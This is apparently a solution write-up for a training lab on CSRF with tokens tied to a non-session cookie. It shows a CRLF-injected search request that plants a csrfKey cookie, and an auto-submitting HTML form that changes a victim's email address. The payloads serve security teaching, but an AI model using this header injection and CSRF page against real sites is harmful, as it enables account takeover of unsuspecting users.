This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
- wiener:peter
- carlos:montoya

# Solution

Exploit /search to Set-Cookie
```http
GET /?search=test%0d%0aSet-Cookie:%20csrfKey=KEY%3b%20SameSite=None HTTP/2
Host: 0ae400b90394293180c40db000050085.web-security-academy.net
```

Response
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=KEY; SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3460
```

```html
<form id="autosubmit" action="https://0ae400b90394293180c40db000050085.web-security-academy.net/my-account/change-email" enctype="application/x-www-form-urlencoded" method="POST">
 <input name="email" type="hidden" value="some-other-email@attacker.com" />
 <input required="" type="hidden" name="csrf" value="ViBs8xdXzUOQGwvXmmN2XDsfsL2UhJVz">
 <input type="submit" value="Submit Request" />
</form>

<img src="https://0ae400b90394293180c40db000050085.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=Sv4rf3KN38q4O0bzYKsuHPkiQUlFDwH1%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
